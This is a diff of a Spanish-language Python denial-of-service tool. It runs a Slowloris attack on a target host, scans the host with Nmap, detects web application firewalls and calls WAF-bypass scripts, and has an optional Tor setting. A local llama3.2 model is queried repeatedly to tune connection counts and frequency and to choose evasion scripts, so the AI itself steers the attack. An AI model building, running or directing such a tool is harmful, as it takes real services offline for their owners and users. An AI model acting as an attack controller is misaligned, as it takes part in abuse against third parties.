@@ -79,9 +79,9 @@ def main():
     logging.info(f"Objetivo: {host}:{port}, SSL={use_ssl}, Conexiones={connections}, Frecuencia={freq}")
     logging.info(f"Uso de Tor: {USE_TOR}")
 
-    # ##########################################################################
+    ###########################################################################
     # 3) NMAP RESUMIDO (+ DETECCIÓN WAF)
-    # ##########################################################################
+    ###########################################################################
     logging.info("[+] Escaneo Nmap rápido...")
     cmd_nmap = [
         "nmap",
@@ -111,29 +111,26 @@ def main():
     if waf_detected:
         logging.info("[!] Posible WAF detectado en la salida de Nmap.")
 
-    # ##########################################################################
+    ###########################################################################
     # 4) LISTADO DE SCRIPTS AVANZADOS PARA WAF
-    # ##########################################################################
+    ###########################################################################
     waf_scripts = [
         "http-waf-bypass",
         "http-waf-evasion",
         "http-waf-fingerprint"
     ]
 
-    # ##########################################################################
+    ###########################################################################
     # 5) FUNCIÓN PARA PREGUNTAR A LA IA
-    # ##########################################################################
+    ###########################################################################
     OLLAMA_URL = "http://127.0.0.1:11434/api/generate"
     OLLAMA_MODEL = "llama3.2"
 
-    def preguntar_ia(prompt_str):
+    def preguntar_ia(payload):
         try:
             resp = requests.post(
                 OLLAMA_URL,
-                json={
-                    "model": OLLAMA_MODEL,
-                    "prompt": prompt_str
-                }
+                json=payload
             )
             if resp.status_code == 200:
                 partes = []
@@ -153,9 +150,9 @@ def main():
         except Exception as ex:
             return f"[Excepción llama3.2] {ex}"
 
-    # ##########################################################################
+    ###########################################################################
     # 6) FUNCIÓN PARA PARSEAR RESPUESTAS DE LA IA
-    # ##########################################################################
+    ###########################################################################
     def parse_response(response):
         nonlocal waf_detected
         # - connections=NN
@@ -188,32 +185,35 @@ def main():
                     logging.warning(f"[!] Fallo al ejecutar script WAF: {e}")
         return updates
 
-    # ##########################################################################
+    ###########################################################################
     # 7) FUNCIÓN PARA MEDIR TIEMPO DE RESPUESTA
-    # ##########################################################################
+    ###########################################################################
     def medir_tiempo_respuesta():
         url = f"http{'s' if use_ssl else ''}://{host}:{port}/"
-        try:
-            start = time.time()
-            resp = requests.get(url, timeout=10)
-            end = time.time()
-            tiempo = end - start
-            logging.info(f"[+] Tiempo de respuesta: {tiempo:.2f} segundos")
-            with response_times_lock:
-                response_times.append(tiempo)
-                # Mantener los últimos 10 registros para el promedio
-                if len(response_times) > 10:
-                    response_times.pop(0)
-        except Exception as e:
-            logging.warning(f"[!] Fallo al medir tiempo de respuesta: {e}")
-            with response_times_lock:
-                response_times.append(None)  # Indica una falla
+        tiempos_locales = []
+        num_pruebas = 3  # Realizar múltiples pruebas para mayor precisión
+        for _ in range(num_pruebas):
+            try:
+                start = time.time()
+                resp = requests.get(url, timeout=10)
+                end = time.time()
+                tiempo = end - start
+                tiempos_locales.append(tiempo)
+                logging.debug(f"[+] Tiempo de respuesta de la prueba: {tiempo:.2f} segundos")
+            except Exception as e:
+                logging.warning(f"[!] Fallo al medir tiempo de respuesta en una prueba: {e}")
+                tiempos_locales.append(None)  # Indica una falla
+
+        # Calcular promedio, ignorando fallas
+        with response_times_lock:
+            for t in tiempos_locales:
+                response_times.append(t)
                 if len(response_times) > 10:
                     response_times.pop(0)
 
-    # ##########################################################################
+    ###########################################################################
     # 8) PROMPT INICIAL A LA IA (INCLUYENDO MEDICIÓN INICIAL)
-    # ##########################################################################
+    ###########################################################################
     # Definir las variables compartidas y locks antes de definir las funciones
     shared_params_lock = threading.Lock()
     shared_params = {
@@ -237,7 +237,9 @@ def main():
     if waf_detected:
         # Prompt para WAF
         scripts_list_str = ", ".join(waf_scripts)
-        prompt_inicial = f"""
+        prompt_inicial = {
+            "model": OLLAMA_MODEL,
+            "prompt": f"""
 Se ha detectado un posible WAF en {host}:{port}.
 Nmap summary:
 {nmap_resumen}
@@ -251,9 +253,12 @@ Puedes cambiar:
 Responde en UNA sola linea, sin palabras cortadas. 
 Ejemplo: "connections=120 freq=5 ejecutar=http-waf-bypass" o "no cambios".
 """
+        }
     else:
-        # Prompt normal: Solo modificar conexiones y freq (llama a meta 3.2 (indicado a config (p5)))
-        prompt_inicial = f"""
+        # Prompt normal: Solo modificar conexiones y freq
+        prompt_inicial = {
+            "model": OLLAMA_MODEL,
+            "prompt": f"""
 No se ha detectado WAF en {host}:{port}.
 Nmap summary:
 {nmap_resumen}
@@ -266,6 +271,7 @@ Puedes cambiar:
 O decir "no cambios".
 Responde en UNA sola linea.
 """
+        }
 
     logging.info("[+] Consultando a la IA (inicio)...")
     resp_ini = preguntar_ia(prompt_inicial)
@@ -279,9 +285,9 @@ Responde en UNA sola linea.
         if "freq" in updates:
             shared_params["freq"] = updates["freq"]
 
-    # ##########################################################################
+    ###########################################################################
     # 9) ATAQUE SLOWLORIS
-    # ##########################################################################
+    ###########################################################################
     attackers = []
     attackers_lock = threading.Lock()
 
@@ -364,9 +370,9 @@ Responde en UNA sola linea.
     creadas = iniciar_conexiones(shared_params["connections"])
     logging.info(f"[+] Conexiones creadas: {creadas}")
 
-    # ##########################################################################
+    ###########################################################################
     # 10) FUNCIÓN DE MONITOREO DE LA IA
-    # ##########################################################################
+    ###########################################################################
     def monitor_ia():
         next_ai_time = time.time() + ai_interval
         while not stop_event.is_set():
@@ -385,20 +391,25 @@ Responde en UNA sola linea.
                             promedio_tiempo = None
 
                     active_connections = len(attackers)
-                    muertos = 0  # lógica para determinar cuántas mueren
+                    muertos = 0  # Lógica para determinar cuántas mueren puede ser mejorada
 
                     if waf_detected:
                         waf_scripts_str = ", ".join(waf_scripts)
-                        prompt_corto = f"""
+                        prompt_corto = {
+                            "model": OLLAMA_MODEL,
+                            "prompt": f"""
 Hay WAF detectado.
 Conex deseadas={current_connections}, activas={active_connections}, muertas={muertos}, freq={current_freq}.
 Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.
 Puedes decir: 'connections=NN', 'freq=NN', 'ejecutar=SCRIPT' (entre {waf_scripts_str}), o 'no cambios'.
 Responde en UNA sola linea.
 """
+                        }
                     else:
                         # Prompt restringido solo a modificar conexiones y freq
-                        prompt_corto = f"""
+                        prompt_corto = {
+                            "model": OLLAMA_MODEL,
+                            "prompt": f"""
 No WAF detectado.
 Conex deseadas={current_connections}, activas={active_connections}, muertas={muertos}, freq={current_freq}.
 Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.
@@ -408,6 +419,7 @@ Puedes cambiar:
 O decir "no cambios".
 Responde en UNA sola linea.
 """
+                        }
 
                     logging.info(f"[+] Consultando a la IA para ajustes dinámicos...")
                     r_ia = preguntar_ia(prompt_corto)
@@ -450,17 +462,17 @@ Responde en UNA sola linea.
                 logging.error(f"[!] Error en monitor_ia: {e}")
                 time.sleep(5)
 
-    # ##########################################################################
+    ###########################################################################
     # 11) FUNCIÓN DE MONITOREO DEL TIEMPO DE RESPUESTA
-    # ##########################################################################
+    ###########################################################################
     def monitor_response_time():
         while not stop_event.is_set():
             medir_tiempo_respuesta()
             time.sleep(check_interval)
 
-    # ##########################################################################
+    ###########################################################################
     # 12) BUCLE PRINCIPAL DE ATAQUE
-    # ##########################################################################
+    ###########################################################################
     stop_event = threading.Event()
     monitor_thread = threading.Thread(target=monitor_ia, daemon=True)
     response_thread = threading.Thread(target=monitor_response_time, daemon=True)
